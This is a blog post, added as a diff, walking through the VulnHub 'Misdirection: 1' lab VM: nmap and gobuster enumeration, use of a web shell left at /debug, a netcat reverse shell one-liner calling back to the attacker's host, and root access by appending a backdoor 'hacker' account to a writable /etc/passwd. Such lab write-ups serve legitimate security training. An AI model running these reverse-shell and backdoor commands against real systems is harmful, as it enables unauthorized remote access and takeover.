@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1># [VulnHub] Misdirection: 1</h1>
+                  <p><a href="/posts/20190920_vulnhub-vulnix.html"> « </a>📅 published on <code>11/Oct/2019</code><a href="/posts/20191017_vulnhub-moria11.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/misdirection-1,371/">Misdirection: 1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_misdirection1/killchain.png" /></p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Fri Oct 11 12:13:32 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/xml/_quick_tcp_nmap.xml 192.168.92.187
+Nmap scan report for 192.168.92.187
+Host is up, received arp-response (0.00080s latency).
+Scanned at 2019-10-11 12:13:33 PDT for 25s
+Not shown: 996 closed ports
+Reason: 996 resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkS5yl+Dpb7vsMGbzAHXBYrVSUNTh4kYGh8zajM3ZujG0XHLvgkW7xJ6F/meai9IrCB5gTq7+tTsn+fqNk0cAZugz4h+vwm5ekXe5szPPHNxNUlKuNAQ0Rch9k7jT/2pWjtsE5iF6yFlh1UA2vBKqrTWVU5vrGWswdFRMWICKWiFXwl1Tv93STPsKHYoVbq74v2y1mVOLn+3JNMmRNCBFqh8Z2x+1DTep0YY8vIV325iRK5ROKCJAPeyX33uoxQ/cYrdPIS+Whs9QX0C+W343Hf2Ypq93h3/g3NNm54LvZdE6X2vTUcUHGdvK2gU+dWQOiDhCpMDv3wiEAwGlf87P5
+|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM+YEivOAqHPDlFWduSuOjAjuJtfC9v/KW2uYB85gxQuibGJQZhFPcxwPEUf7UvQ/a5fr/keKYF2Kdld6gO44jY=
+|   256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHxbfiqinvu3cV7JoKrOF3w64zk+0N0h+/2nu+Z20Mk
+80/tcp   open  http    syn-ack ttl 64 Rocket httpd 1.2.6 (Python 2.7.15rc1)
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS
+|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
+8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 00:0C:29:F0:F4:AE (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Oct 11 12:13:58 2019 -- 1 IP address (1 host up) scanned in 26.69 seconds
+</code></pre>
+
+<p>2. We start with <code>8080/tcp</code> service. There are some interesting hits from <code>gobuster</code> scan:  </p>
+<pre><code>http://192.168.92.187:8080/debug (Status: 301)
+http://192.168.92.187:8080/shell (Status: 301)
+http://192.168.92.187:8080/wordpress (Status: 301)
+</code></pre>
+
+<p>3. Upon checking out the <code>/debug</code> url, we find that it has a PHP web shell called <a href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>. This is a huge convenience as we can now spawn a reverse shell and get fully interactive access:  </p>
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_misdirection1/screenshot00.png" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports:</h4>
+<pre><code>22/tcp    |  ssh    |  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    |  http   |  Rocket httpd 1.2.6 (Python 2.7.15rc1)
+3306/tcp  |  mysql  |  MySQL (unauthorized)
+8080/tcp  |  http   |  Apache httpd 2.4.29 ((Ubuntu))
+</code></pre>
+
+<h4>Files</h4>
+<pre><code>http://192.168.92.187:8080/debug
+</code></pre>
+
+<h4>Users</h4>
+<pre><code>ssh: root, brexit
+</code></pre>
+
+<h2>Phase #2: Exploitation</h2>
+<p>1. We use the web shell to spawn a Bash reverse shell and catch it using a local <code>netcat</code> listener:  </p>
+<pre><code>nc -nlvp 443
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.92.183 443 &gt;/tmp/f
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_misdirection1/screenshot01.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_misdirection1/screenshot02.png" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>www-data@misdirection&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@misdirection&gt;  
+www-data@misdirection&gt; uname
+Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+www-data@misdirection&gt;  
+www-data@misdirection&gt; ifconfig
+ens33:  flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.92.187  netmask 255.255.255.0  broadcast 192.168.92.255
+        inet6 fe80::20c:29ff:fef0:f4ae  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:0c:29:f0:f4:ae  txqueuelen 1000  (Ethernet)
+        RX packets 847916  bytes 329992802 (329.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 624984  bytes 125640093 (125.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+www-data@misdirection&gt;  
+www-data@misdirection&gt; users
+root
+brexit
+</code></pre>
+
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. We find that the user <code>brexit</code> can run <code>bash</code> with <code>sudo</code> privileges. We also find that the <code>/etc/passwd</code> file has write permissions for group <code>brexit</code>. Combining these two, we need to first switch to user <code>brexit</code> and then modify the <code>/etc/passwd</code> file to add a new entry for a backdoor <code>root</code> user:  </p>
+<pre><code>sudo -l
+  User www-data may run the following commands on localhost:
+    (brexit) NOPASSWD: /bin/bash
+ls -la /etc/passwd
+  -rwxrwxr-- 1 root brexit 1617 Jun  1 01:17 /etc/passwd
+sudo -u brexit bash
+mkpasswd -m sha-512 password saltsalt
+  $6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/
+echo -e &quot;hacker:\$6\$saltsalt\$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/:0:0:hacker:/root:/bin/bash&quot; &gt;&gt;/etc/passwd
+su hacker
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_misdirection1/screenshot03.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_misdirection1/screenshot04.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_misdirection1/screenshot05.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.4" src="/static/files/posts_vulnhub_misdirection1/screenshot06.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.5" src="/static/files/posts_vulnhub_misdirection1/screenshot07.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.6" src="/static/files/posts_vulnhub_misdirection1/screenshot08.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.7" src="/static/files/posts_vulnhub_misdirection1/screenshot09.png" />  </p>
+<p>2. We can view the file <code>/root/root.txt</code> to get the flag and complete the challenge:  </p>
+<pre><code>cat /root/root.txt
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_misdirection1/screenshot10.png" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>root:$6$PnbVvEMS$OcseJT8lZRrgrW1JBpHJ252SPRxS6Rkh3oVBkrbRBZgHBD1wArL6FcyO5daqaon7waFKwSqbg5fIjFgzU........................
+brexit:$6$51s7qYVw$XbTfXEV2acHRp9vmA7VTxO35OLK9EGZJzDGF9nYaukD3eppHsn2P1ESMr.9rRn/YYO70uiUskfkWP0LyR........................
+</code></pre>
+
+<h3>Flags</h3>
+<pre><code>0d2c6222bfdd3701e0fa12a9a.......
+</code></pre>
+
+<h2>References</h2>
+<p>[+] <a href="https://www.vulnhub.com/entry/misdirection-1,371/">https://www.vulnhub.com/entry/misdirection-1,371/</a><br />
+[+] <a href="https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf">https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf</a>  </p>
+        <hr/>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#oscp>oscp</a>, <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeups>writeups</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190920_vulnhub-vulnix.html">[VulnHub] HackLAB: Vulnix...</a> « | » <a href="/posts/20191017_vulnhub-moria11.html">[VulnHub] Moria: 1.1...</a> »</p>
+                <hr/>
+    </div>
+    <div class="footer">
+      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">📝 CC BY 4.0</a>]</p>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+  </body>
+</html>
